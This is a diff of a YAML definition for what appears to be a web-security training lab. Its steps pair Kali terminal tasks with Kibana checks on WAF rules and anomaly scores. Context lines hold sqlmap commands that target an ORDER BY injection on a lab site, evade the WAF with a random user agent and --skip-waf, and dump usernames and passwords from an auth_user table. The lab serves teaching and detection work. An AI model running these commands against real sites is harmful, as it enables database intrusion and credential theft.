@@ -399,7 +399,7 @@ foundations:
         point: {opens: elk, kibana: {doc: rule_id}}
         check: {kind: answer, of: rule, marker: browse, path: "<script", known: ["949110"]}
       - id: score
-        point: {opens: elk, kibana: {doc: rule}}
+        point: {opens: elk, kibana: {doc: rule}, keep: true}
         check: {kind: answer, of: anomaly_total, about: probe}
       - id: upper
         point: {opens: site, site: "input[name=q]", until: sent, then: {dev: general.status}}
@@ -449,7 +449,7 @@ foundations:
         point: {opens: elk, kibana: {doc: rule_id}}
         check: {kind: choice, of: waf_detected, about: error, options: [present, absent]}
       - id: sqlmap
-        point: {opens: kali, term: {pane: kali, match: '\$ $'}}
+        point: {opens: kali, term: {pane: kali, match: '\$ $', done: '\[\*\] ending @'}}
         command: 'sqlmap -u "http://board.com/?sort=posts_post.id*" --dbms=mysql --technique=BT --level=5 --risk=3 --batch --flush-session'
         check: {kind: kali, case: board-sqli-orderby-sqlmap-probe}
       - id: verdict
@@ -462,7 +462,7 @@ foundations:
         point: {opens: elk, kibana: {doc: rule}}
         check: {kind: answer, of: rule, marker: "step:sqlmap", family: "913"}
       - id: agent
-        point: {opens: kali, term: {pane: kali, match: '\$ $'}}
+        point: {opens: kali, term: {pane: kali, match: '\$ $', done: '\[\*\] ending @'}}
         command: 'sqlmap -u "http://board.com/?sort=posts_post.id*" --dbms=mysql --technique=BT --level=5 --risk=3 --batch --flush-session --random-agent'
         check: {kind: kali, case: board-sqli-orderby-sqlmap-random-agent, ua: any}
       - id: still
@@ -485,7 +485,7 @@ foundations:
         command: grep -n ruleRemove {waf_rules}
         check: {kind: answer, of: excluded_target}
       - id: dump
-        point: {opens: kali, term: {pane: kali, match: '\$ $'}}
+        point: {opens: kali, term: {pane: kali, match: '\$ $', done: '\[\*\] ending @'}}
         command: 'sqlmap -u "http://board.com/?sort=posts_post.id*" --dbms=mysql --technique=BT --level=5 --risk=3 --random-agent --skip-waf -D board -T auth_user -C username,password --dump --batch --answers="crack=N" --flush-session'
         check: {kind: kali, case: board-sqli-orderby-sqlmap-skip-waf, ua: any}
       - id: loot
